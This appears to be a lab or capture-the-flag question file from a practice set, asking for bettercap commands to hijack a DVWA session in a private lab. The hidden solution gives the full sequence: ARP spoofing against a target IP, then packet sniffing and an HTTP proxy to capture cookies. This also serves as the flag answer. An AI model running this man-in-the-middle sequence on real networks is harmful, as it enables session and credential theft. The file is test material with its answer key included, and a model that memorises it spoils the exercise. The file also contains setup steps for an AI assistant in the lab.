# Q149 — bettercap HTTP Session Hijack

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🔴 Hard |
| **Tools** | `hping3`, `hulk`, `setoolkit`, `bettercap`, `shodan` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use bettercap modules `net.sniff` + `http.proxy` to hijack DVWA session. Provide caplet commands.

---

## 🎯 Flag Format

```
cmds=<text>
```

Example: `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on; http.proxy on`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Run with elevated privileges.
</details>

<details>
<summary>Hint 2</summary>

Cookies appear in sniff output.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.52.129
> arp.spoof on
> net.sniff on
> http.proxy on
```

Captures HTTP cookies.

**Answer:** `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on; http.proxy on`

📖 Ref: [tools/bettercap.md](../../tools/bettercap.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q149".
```
